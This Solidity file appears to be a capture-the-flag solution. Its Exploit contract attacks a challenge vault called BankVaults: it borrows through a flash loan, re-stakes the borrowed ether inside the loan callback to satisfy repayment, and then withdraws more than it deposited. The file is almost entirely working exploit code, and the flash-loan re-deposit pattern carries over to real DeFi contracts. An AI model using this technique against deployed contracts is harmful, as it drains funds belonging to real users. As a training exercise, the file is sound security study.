// // SPDX-License-Identifier: MIT
// pragma solidity 0.8.28;

pragma solidity 0.8.28;

import {Setup} from "src/Setup.sol";
import {BankVaults} from "src/BankVaults.sol";
import {console2} from "forge-std/console2.sol";
import {IFlashLoanReceiver} from "src/BankVaults.sol";
import {MockERC20} from "src/MockERC20.sol";

contract Exploit is IFlashLoanReceiver {
    Setup public setup;
    BankVaults public bankVaults;
    MockERC20 public mockERC20;

    constructor(address setupAddress) payable {
        require(msg.value == 1 ether, "need to send 1 ether"); 
        setup = Setup(setupAddress);
        bankVaults = setup.challengeInstance();
        mockERC20 = setup.mockERC20();
    }

    function exploit() public {
        bankVaults.stake{value: 1 ether}(address(this));
        bankVaults.flashLoan(50 ether, address(this), type(uint256).max);
        bankVaults.withdraw(51 ether, address(this), address(this));
    }

    function executeFlashLoan(uint256 amount) external override {
        console2.log("bankVaults balance before staking", address(bankVaults).balance);
        bankVaults.stake{value: amount}(address(this));
        console2.log("bankVaults balance after staking", address(bankVaults).balance);
    }

    receive() external payable {
    }
}